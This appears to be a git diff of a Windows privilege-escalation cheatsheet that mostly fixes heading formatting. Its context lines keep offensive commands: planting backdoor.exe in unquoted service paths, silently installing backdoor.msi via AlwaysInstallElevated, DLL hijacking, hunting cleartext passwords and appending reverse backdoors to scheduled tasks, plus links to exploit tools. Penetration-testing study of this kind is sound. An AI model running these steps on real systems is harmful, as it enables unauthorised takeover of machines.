@@ -21,7 +21,7 @@ categories: cheatsheet
     
 
 
-#Privilege Escalation Tools
+## Privilege Escalation Tools
 **PowerUp:**
 https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
 
@@ -32,7 +32,7 @@ https://github.com/GhostPack/SharpUp
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
 
 
-##Kernel Exploit Step
+## Kernel Exploit Step
 1. Find Windows Version with Command systeminfo.
 2. Search for exploit.
 3. Compile and run.
@@ -60,7 +60,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 ```
 
 
-##Exploiting Services
+## Exploiting Services
 There are Various way to enumerate running services. Services Commands are:
 
 **List all services**
@@ -103,7 +103,7 @@ net start/stop service_name
 ```
 
 
-###Insecure Service Permission
+### Insecure Service Permission
 Find suspicious service and check configuration:
 ```bat
 sc qc service_name
@@ -117,7 +117,7 @@ net start service_name
 ```
 ....**NOTE: if not able to restart the service then, we may need to restart the windows**
 
-###Unquoted Service Path
+### Unquoted Service Path
 Finding Unquoted Service with wmic command:
 ```bat
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
@@ -136,7 +136,7 @@ copy backdoor.exe "C:\Program Files\Service Path\Vulnerable Service\service_name
 net start service_name
 ```
 
-###Insecure Registry Permission
+### Insecure Registry Permission
 If the current can't modify the service directory but has permission to modify it's registry, we can escalate privillege!
 
 **Manually Checking:**
@@ -154,11 +154,11 @@ net start service_name
 ```
 Reference: ```https://book.hacktricks.xyz/windows/windows-local-privilege-escalation```
 
-###Insecure Service Executeable
+### Insecure Service Executeable
 If we can replace the original binary file, we can replace it with our reverse backdoor(Not so common though)
 
 
-###DLL Hijacking
+### DLL Hijacking
 If a service or program running as system, missing a dll, and we have write permission to the path where windows search for dll, we can create our own malicious and escalate to higher privillege.
 
 ```cmd
@@ -174,7 +174,7 @@ net start service_name
 #or try to execute the program
 ```
 
-##Exploiting Startup Program and AlwaysInstallElevated 
+## Exploiting Startup Program and AlwaysInstallElevated 
 If we can modify the startup program,we can replace the original program with ours. 
 1. **Startup Program**
 Note: These command just copy and paste from ```https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software```
@@ -219,7 +219,7 @@ msiexec /quiet /qn /i C:\windows\temp\backdoor.msi
 ```
 
 
-##Escalatiing With Passwords
+## Escalatiing With Passwords
 We need to search for clear text password in various location.
 
 ```bat
@@ -269,7 +269,7 @@ schtasks /query /fo LIST /v
 If so we can we can appened our reverse backdoor to that script and wait for shell!
 
 
-##Exploiting Installed Application
+## Exploiting Installed Application
 Finding running process
 ```bat
 tasklist /v
@@ -279,7 +279,7 @@ tasklist /v
 Now search for known exploit!
 
 
-##HotPotato
+## HotPotato
 Potato Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012. Compiled version: ```https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release```
 
 Command:
